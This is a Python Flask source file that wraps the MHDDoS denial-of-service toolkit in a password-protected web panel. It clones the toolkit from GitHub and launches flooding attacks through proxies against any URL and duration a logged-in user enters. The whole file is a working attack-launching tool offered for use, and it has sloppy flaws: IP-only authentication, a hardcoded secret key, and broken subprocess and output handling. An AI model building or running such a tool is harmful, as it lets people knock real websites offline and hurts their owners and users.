# MHDDoS WebUI
# Made by EletrixTime

from flask import Flask, render_template, request, redirect, url_for, flash, jsonify,send_from_directory,send_file
import os
import json
import subprocess
import threading
# checking if the MHDDOS folder exist
if not os.path.exists("data/mhddos"):
    os.system("git clone https://github.com/MatrixTM/MHDDoS data/mhddos")

AUTHORIZED_IPS = []
app = Flask(__name__,template_folder="html")
app.secret_key = "secretqs^pdqsqdqd4q65sd465q"
class LOGS():
    def warning(text):
        print(f"[WARNING] {text}")
    def error(text):
        print(f"[ERROR] {text}")
    def info(text):
        print(f"[INFO] {text}")



LOGS.info("Loading config.json")
JSONCONFIG = json.loads(open("data/config.json", "r").read())

@app.before_request
def before_request():
    # verife if the request url dont contais /static
    if request.path.startswith("/static") or request.path.startswith("/index"):
        return
    elif request.remote_addr not in AUTHORIZED_IPS:
        LOGS.error("Unauthorized IP address: " + request.remote_addr)
        flash("Please login")
        return render_template("index.html"),403
@app.route("/static/<string:path>")
def send_assets_static(path):
    try:
        return send_file(os.path.join("html/static", path)),200
    except:
        return "404",404

@app.route("/index",methods=["GET","POST"])
def index():
    if request.method == "POST":
        LOGS.info("Login request received (from " + request.remote_addr + ")")
        if request.form["password"] == JSONCONFIG["admin_password"]:
            LOGS.info("Login success")
            AUTHORIZED_IPS.append(request.remote_addr)
            return redirect(url_for("dashboard"))     
        else:
            flash("Invalid password.")
            LOGS.error("Login failed")
    
    return render_template("index.html")
@app.route("/attack/new/sevenlayer",methods=["GET","POST"])
def newattack():
    if request.method == "POST":
        LOGS.info("New attack request received (from " + request.remote_addr + ")")
        type_attack = request.form["attacktype"]
        url = request.form["url"]
        time = request.form["time"]
        # startinng the attack 
        out = "ERROR"
        def run_attack():
            global out
            arguments = [f"{type_attack}", f"{url}", str(0), str(100), "proxies.txt", f"{time}"]
            command = ["python3", "data/mhddos/start.py"] + arguments
            process = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            
            out = ""
            for line in process.stdout:
                out += line + "\n"
            for line in process.stderr:
                out += line + "\n"
            
            LOGS.info(f"Attack output: {out}")
            LOGS.info("Attack completed")

        attack_thread = threading.Thread(target=run_attack)
        attack_thread.start()
        flash(f"Attack launched \n {out}")
        LOGS.info("New attack launched")
    
    return render_template("dash.html",attackout=out)
@app.route("/dash")
def dashboard():
    return render_template("dash.html")

LOGS.info("MHDDoS WebUI starting...")

app.run(host=JSONCONFIG["server_ip"], port=int(JSONCONFIG["server_port"]))
